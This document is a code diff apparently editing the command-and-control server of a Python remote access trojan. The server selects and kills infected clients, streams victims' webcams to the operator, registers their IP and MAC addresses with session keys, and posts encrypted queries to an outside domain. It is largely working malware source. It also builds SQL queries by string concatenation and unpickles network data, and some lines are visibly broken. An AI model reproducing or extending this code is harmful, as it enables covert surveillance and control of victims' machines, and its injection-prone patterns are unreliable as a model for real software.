@@ -84,7 +84,7 @@ __PORT__    = 1337
 ___DB___    = {
     'domain': 'https://snapchat.sex/',
     'pages': {
-        'results'   : 'results.php?id={}',
+        'results'   : 'result.php?id={}',
         'query'     : 'query.php',
         'session'   : 'session.php'
         },
@@ -120,15 +120,14 @@ class ServerThread(threading.Thread):
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'exit'          :   self.quit_server,
-            'info'          :   self.show_client_info,
             'kill'          :   self.remove_client,
-            'threads'       :   self.get_threads,
             'quit'          :   self.quit_server,
             'query'         :   self.query_database,
             'results'       :   self.show_task_results,
             'select'        :   self.select_client,
 	    'sendall'	    :   self.sendall_clients,
             'settings'      :   self.settings,
+            'session'       :   self.get_current_session,
             'webcam'        :   self.webcam_client,
             '--help'        :   self.usage,
             '-h'            :   self.usage,
@@ -159,34 +158,36 @@ class ServerThread(threading.Thread):
             self.lock.clear()
             print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
             self.lock.set()
+        print(self._text_color + self._text_style)
 
     def _print(self, data):
         print(self._text_color + self._text_style)
+        try:
+            data     = json.loads(bytes(data))
+            max_len  = "{:<%d}" % int(max([len(i) for i in data.keys()]) + 2)
+        except: 
+            data = bytes(data)
         if self.current_client:
             self.current_client.lock.clear()
             try:
-                data = json.loads(bytes(data))
-                print(json.dumps({"{:<25}".format(k): "{:>55}".format(v) for k,v in data.items()}, indent=2))
+                print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
             except:
-                data = bytes(data)
-                print("\n" + data + "\n")
+                print("\n" + data)
             self.current_client.lock.set()
         else:
             self.lock.clear()
             try:
-                data = json.loads(bytes(data))
-                print(json.dumps({"{:<25}".format(k): "{:>55}".format(v) for k,v in data.items()}, indent=2))
+                print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
             except:
-                data = bytes(data)
-                print("\n" + data + "\n")
+                print("\n" + data)
             self.lock.set()
 
     def _return(self):
         if self.current_client:
+            self.lock.clear()
             self.current_client.lock.set()
             return self.current_client.run()
         else:
-            self.current_client = None
             self.lock.set()
             return self.run()
 
@@ -303,7 +304,7 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client = self.current_client
         else:
-            self._error("Failed to encrypt data '{}' - invalid Client ID: {}".format(data, client_id))
+            self._error("Failed to {} data '{}' - invalid Client ID: {}".format(self.encrypt.func_name, data, client_id))
             self._return()
         try:
             return self._encrypt_aes(data, self._deobfuscate(client.session_key)) if len(self._deobfuscate(client.session_key)) == 64 else self._encrypt_xor(data, self._deobfuscate(client.session_key))
@@ -316,7 +317,7 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client = self.current_client
         else:
-            self._error("Failed to decrypt data '{}' - invalid Client ID: {}".format(data, client_id))
+            self._error("Failed to {} data '{}' - invalid Client ID: {}".format(self.decrypt.func_name, data, client_id))
             self._return()
         try:
             return self._decrypt_aes(data, self._deobfuscate(client.session_key)) if len(self._deobfuscate(client.session_key)) == 64 else self._decrypt_xor(data, self._deobfuscate(client.session_key))        
@@ -329,7 +330,7 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client = self.current_client
         else:
-            self._error("Failed to send command '{}' - Invalid Client ID: {}".format(command, client_id))
+            self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
             task_id = self.new_task_id(command, client_id)
@@ -345,7 +346,7 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client  = self.current_client
         else:
-            self._error('Unable to receive data - Invalid Client ID: {}'.format(client_id))
+            self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
             buf     = ''
@@ -355,7 +356,7 @@ class ServerThread(threading.Thread):
                 except: break
             if len(buf):
                 data = self.decrypt(buf, client.name)
-                return json.loads(data, encoding='utf-8')
+                return json.loads(data)
             return
         except Exception as e:
             self._error("{} returned error: {}".format(self.recv_client.func_name, str(e)))
@@ -373,7 +374,8 @@ class ServerThread(threading.Thread):
                 self.current_client.lock.clear()
             client = self.clients[int(client_id)]
             self.current_client = client
-            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected\n".format(client.name, client.addr[0]) + self._text_color + self._text_style)
+            print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "\n\n\t[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Client {} selected".format(client.name, client.addr[0]) + self._text_color + self._text_style)
+            print(self._text_color + self._text_style)
             self.current_client.lock.set()
             return self.current_client.run()
 
@@ -392,48 +394,42 @@ class ServerThread(threading.Thread):
             try:
                 self.send_client(msg, client.name)
             except Exception as e:
-                self._error('Message to client {} failed with error: {}'.format(client.name, str(e)))
+                self._error('{} failed with error: {}'.format(self.sendall_clients.func_name, str(e)))
         self._return()
     
     def remove_client(self, client_id):
         if not str(client_id).isdigit() or int(client_id) not in self.clients:
             return
         else:
-            client = self.clients[int(client_id)]
-            client.lock.clear()
-            self.send_client('kill', client_id)
-            client.connection.close()
-            _ = self.clients.pop(int(client_id), None)
-            del _
-            if not self.current_client:
-                self.lock.clear()
-                self._print('Client {} disconnected'.format(client_id))
-                self.lock.set()
-                return self.run()
-            elif int(client_id) == self.current_client.name:
-                self.current_client.lock.clear()
-                self.lock.set()
-                self._print('Client {} disconnected'.format(client_id))
-                self.lock.clear()
-                self.current_client.lock.set()
-                return self.current_client.run()
-            else:
-                self.current_client.lock.clear()
-                self.lock.set()
-                self._print('Client {} disconnected'.format(client_id))
-                self.lock.clear()
-                self.current_client.lock.set()
-                return self.current_client.run()
+            try:
+                client = self.clients[int(client_id)]
+                client.lock.clear()
+                self.send_client('kill', client_id)
+                client.connection.close()
+                _ = self.clients.pop(int(client_id), None)
+                del _
+                if not self.current_client:
+                    self.lock.clear()
+                    self._print('Client {} disconnected'.format(client_id))
+                    self.lock.set()
+                    return self.run()
+                elif int(client_id) == self.current_client.name:
+                    self.current_client.lock.clear()
+                    self.lock.set()
+                    self._print('Client {} disconnected'.format(client_id))
+                    self.lock.clear()
+                    self.current_client.lock.set()
+                    return self.current_client.run()
+                else:
+                    self.current_client.lock.clear()
+                    self.lock.set()
+                    self._print('Client {} disconnected'.format(client_id))
+                    self.lock.clear()
+                    self.current_client.lock.set()
+                    return self.current_client.run()
+            except Exception as e:
+                self._error('{} failed with error: {}'.format(self.remove_client.func_name, str(e)))
 
-    def show_client_info(self, client_id=None):
-        if str(client_id).isdigit() and int(client_id) in self.clients:
-            client = self.clients[int(client_id)]
-            return '\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n'
-        elif self.current_client:
-            client = self.current_client
-            return '\n'.join(['\n {}{:>20}'.format('ENVIRONMENT','VARIABLES')] + [' --------------------------------'] + [' {:>13} {:>18}'.format(a,b) for a,b in client.info.items()]) + '\n'
-        else:
-            return 'Unable to display client information - invalid Client ID'
 
     def list_clients(self):
         print(self._text_color + colorama.Style.BRIGHT + '\n{:>3}'.format('#') + colorama.Fore.YELLOW + colorama.Style.DIM + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>64}'.format('Client ID') + colorama.Style.DIM + colorama.Fore.YELLOW + ' | ' + colorama.Style.BRIGHT + self._text_color + '{:>16}'.format('Address') + colorama.Style.DIM + colorama.Fore.YELLOW  + '\n-----------------------------------------------------------------------------------------')
@@ -450,15 +446,12 @@ class ServerThread(threading.Thread):
                 print(str(e))
         exit()
 
-    def get_threads(self):
-        self._print('Session Key: {}'.format(self._deobfuscate(self.db.get('session_key'))))
-        self._print('\n'.join([' {:>20}\t{:>40}'.format('Threads','Status'), ' ---------------------------------------------------------------']  + [' {:>20}\t{:>40}'.format(a, self._get_status(c=time.time()-float(threads[a].name))) for a in threads if threads[a].is_alive()]) + '\n')
-
     def settings(self, args=None):
         if not args:
-            print(colorama.Fore.WHITE + '\n\t\tSettings')
+            print(colorama.Fore.RESET + colorama.Style.BRIGHT + '\n\t\tSettings')
             print(self._text_color + self._text_style + '\tdefault text color + style')
             print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style\n')
+            print(self._text_color + self._text_style)
         else:
             target, _, options = args.partition(' ')
             setting, _, option = options.partition(' ')
@@ -512,53 +505,55 @@ class ServerThread(threading.Thread):
 
 
     def webcam_client(self, args=''):
-        if not self.current_client:
-            self._error( "No client selected")
-        client = self.current_client
-        result = ''
-        mode, _, arg = args.partition(' ')
-        client.lock.clear()
-        if not mode or str(mode).lower() == 'stream':
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            retries = 5
-            while retries > 0:
-                try:
-                    port = random.randint(6000,9999)
-                    s.bind(('0.0.0.0', port))
-                    s.listen(1)
-                    cmd = 'webcam stream {}'.format(port)
-                    self.send_client(cmd, client.name)
-                    conn, addr  = s.accept()
-                    break
-                except:
-                    retries -= 1
-            header_size = struct.calcsize("L")
-            window_name = addr[0]
-            cv2.namedWindow(window_name)
-            data = ""
-            try:
-                while True:
-                    while len(data) < header_size:
-                        data += conn.recv(4096)
-                    packed_msg_size = data[:header_size]
-                    data = data[header_size:]
-                    msg_size = struct.unpack("L", packed_msg_size)[0]
-                    while len(data) < msg_size:
-                        data += conn.recv(4096)
-                    frame_data = data[:msg_size]
-                    data = data[msg_size:]
-                    frame = pickle.loads(frame_data)
-                    cv2.imshow(window_name, frame)
-                    key = cv2.waitKey(70)
-                    if key == 32:
+        try:
+            if not self.current_client:
+                self._error( "No client selected")
+            client = self.current_client
+            result = ''
+            mode, _, arg = args.partition(' ')
+            client.lock.clear()
+            if not mode or str(mode).lower() == 'stream':
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                retries = 5
+                while retries > 0:
+                    try:
+                        port = random.randint(6000,9999)
+                        s.bind(('0.0.0.0', port))
+                        s.listen(1)
+                        cmd = 'webcam stream {}'.format(port)
+                        self.send_client(cmd, client.name)
+                        conn, addr  = s.accept()
                         break
-            finally:
-                conn.close()
-                cv2.destroyAllWindows()
-                client.lock.set()
-        else:
-            self.send_client("webcam %s" % args, client.name)
-
+                    except:
+                        retries -= 1
+                header_size = struct.calcsize("L")
+                window_name = addr[0]
+                cv2.namedWindow(window_name)
+                data = ""
+                try:
+                    while True:
+                        while len(data) < header_size:
+                            data += conn.recv(4096)
+                        packed_msg_size = data[:header_size]
+                        data = data[header_size:]
+                        msg_size = struct.unpack("L", packed_msg_size)[0]
+                        while len(data) < msg_size:
+                            data += conn.recv(4096)
+                        frame_data = data[:msg_size]
+                        data = data[msg_size:]
+                        frame = pickle.loads(frame_data)
+                        cv2.imshow(window_name, frame)
+                        key = cv2.waitKey(70)
+                        if key == 32:
+                            break
+                finally:
+                    conn.close()
+                    cv2.destroyAllWindows()
+                    client.lock.set()
+            else:
+                self.send_client("webcam %s" % args, client.name)
+        except Exception as e:
+            self._error("webcam stream failed with error: {}".format(str(e)))
     
     def new_task_id(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -566,7 +561,7 @@ class ServerThread(threading.Thread):
         elif self.current_client:
             client = self.current_client
         else:
-            self._error("Task ID failed - invalid Client ID")
+            self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
             return SHA256.new(bytes(client.id) + bytes(command) + bytes(time.time())).hexdigest()
@@ -586,19 +581,34 @@ class ServerThread(threading.Thread):
             cmd, _, action = bytes(task.get('command')).partition(' ')
             if cmd in self.default_tasks:
                 try:
-                    output  = self.query_database("INSERT INTO tasks (task_id, client, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client'], task['command'], task['data']))))
+                    query   = "INSERT INTO tasks (task_id, client, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client'], task['command'], task['data'])))
+                    output  = self.query_database(query)
                 except Exception as e:
                     self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
         else:
             self._error('Invalid task: {}'.format(bytes(task)))
             self._return()
 
+    def get_current_session(self):
+        try:
+            return self._deobfuscate(self.db['session_key']) if self.db.get('session_key') else "None"
+        except Exception as e:
+            self._error("{} returned error: {}".format(self.get_current_session.func_name, str(e)))
+
     def query_database(self, query):
         key     = self.db['session_key'] if self.db.get('session_key') else self.diffiehellman()
         query   = self._encrypt_aes(query, self._deobfuscate(key))
         data    = requests.post(self.db['domain'] + self.db['pages']['query'], data={'query': query}).content
-        output  = self._decrypt_aes(data, self._deobfuscate(key)) if data else data
-        return output
+        if data:
+            output  = self._decrypt_aes(data, self._deobfuscate(key))
+            if output:
+                if '\n' in output:
+                    for row in output.split('\n'):
+                        try:
+                            self._print(row)
+                        except: break
+                else:
+                    self._print(output)
 
     def connection_handler(self):
         while True:
@@ -680,28 +690,26 @@ class ClientHandler(threading.Thread):
         try:
             data = threads['server']._decrypt_aes(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
         except Exception as e1:
-            self._error("AES encryption failed: {}".format(str(e1)))
             try:
                 data = threads['server']._decrypt_xor(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
             except Exception as e2:
-                self._error("XOR encryption failed: {}".format(str(e2)))
+                self._error("Encryption failed\nAES error: {}\nXOR error: {}".format(str(e1, e2)))
+                return
         try:
             return json.loads(data.rstrip())
         except Exception as e3:
-            self._error("Failed to identify client host machine: {}".format(str(e1)))
+            self._error("{} returned error: {}".format(self._info.func_name, str(e3)))
 
     def _register(self):
         try:
-            client_id   = SHA256.new(bytes(self.info['ip']) + bytes(self.info['mac'])).hexdigest()
+            client_hash = SHA256.new(bytes(self.info['ip']) + bytes(self.info['mac'])).hexdigest()
             try:
-                session = requests.post(threads['server'].db['domain'] + threads['server'].db['pages']['session'], data={'ip': self.info['ip'], 'session_key': self.session_key}).content
-                query   = "UPDATE clients SET {} WHERE ip='%s'".format(', '.join("{}='{}'".format(k,v) for k,v in self.info.items() + [('hash', client_id)])) % self.info['ip']
-                threads['server'].query_database(query)
-                data    = threads['server']._encrypt_aes(client_id, threads['server']._deobfuscate(self.session_key)) if 'AES' in self.info['encryption'] else threads['server']._encrypt_xor(uid, threads['server']._deobfuscate(self.session_key))
+                threads['server'].query_database("INSERT INTO clients ({}) VALUES ({})".format(', '.join([k for k in self.info.keys() + ['hash','session_key']]), ', '.join(["'{}'".format(v) for v in self.info.values() + [client_hash, self.session_key]])))
+                data = threads['server']._encrypt_aes(client_hash, threads['server']._deobfuscate(self.session_key)) if 'AES' in self.info['encryption'] else threads['server']._encrypt_xor(uid, threads['server']._deobfuscate(self.session_key))
                 self.connection.sendall(data + '\n')
             except Exception as e:
                 self._error(str(e))
-            return client_id
+            return client_hash
         except Exception as e2:
             self._error("Client registration failed: {}".format(str(e2)))
 
